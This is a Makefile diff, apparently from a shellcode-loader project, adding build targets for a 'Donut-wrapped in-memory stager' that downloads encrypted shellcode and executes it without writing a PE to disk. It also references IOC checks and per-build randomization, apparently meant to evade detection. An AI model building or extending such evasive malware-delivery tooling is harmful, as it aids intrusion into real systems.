@@ -80,6 +80,19 @@ release-nocrt: $(LOADER_SRC) $(SRCDIR)/nocrt_runtime.c | $(BUILDDIR)
 	@echo "=== release-nocrt: built (no CRT) ==="
 	@python3 tools/check_iocs.py $(BUILDDIR)/loader-nocrt.exe || true
 
+# ---- Donut-wrapped in-memory stager ----
+# Downloads a Donut-encrypted shellcode blob and jumps. No PE touches disk
+# beyond the stager itself. See src/stager.c + scripts/donut-wrap.sh.
+STAGER_SRC = $(SRCDIR)/stager.c $(SRCDIR)/http.c $(SRCDIR)/peb.c \
+             $(SRCDIR)/halos.c $(SRCDIR)/camouflage.c
+
+stager: $(STAGER_SRC) | $(BUILDDIR)
+	$(CC) $(CFLAGS_RELEASE) -o $(BUILDDIR)/stager.exe $(STAGER_SRC) $(LDFLAGS_RELEASE)
+	@python3 tools/check_iocs.py $(BUILDDIR)/stager.exe || true
+
+stager-debug: $(STAGER_SRC) | $(BUILDDIR)
+	$(CC) $(CFLAGS_DEBUG) -o $(BUILDDIR)/stager.exe $(STAGER_SRC) $(LDFLAGS_DEBUG)
+
 # ---- F22: build-to-build randomization ----
 # N8: always regenerate build_id.h so each `make release-random` produces a
 # unique binary (the old target reused the stale header if it existed).
@@ -99,4 +112,4 @@ $(SRCDIR)/build_id.h:
 clean:
 	rm -rf $(BUILDDIR)/*
 
-.PHONY: all encode2aes-linux debug release release-verify clean
+.PHONY: all encode2aes-linux debug release release-verify stager stager-debug clean
